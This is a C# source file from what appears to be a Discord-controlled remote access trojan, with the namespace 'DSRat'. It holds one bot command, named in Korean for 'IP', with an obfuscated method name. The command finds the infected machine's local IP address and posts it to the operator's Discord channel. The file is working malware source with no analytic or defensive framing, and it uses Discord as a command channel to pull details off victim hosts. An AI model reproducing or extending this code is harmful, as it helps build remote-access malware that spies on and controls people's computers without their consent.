using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace DSRat
{
    public class soqnip : ModuleBase<SocketCommandContext>
    {
        [Command("아이피")]
        public async Task SDBNAKJDNKljnekljfnekljwnfSNDKLJNLK12638712678HSKJDHk()
        {
            string localIP = string.Empty;
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                localIP = endPoint.Address.ToString();
            }
            await Context.Channel.SendMessageAsync("아이피는 : " +  localIP);
        }
    }
}
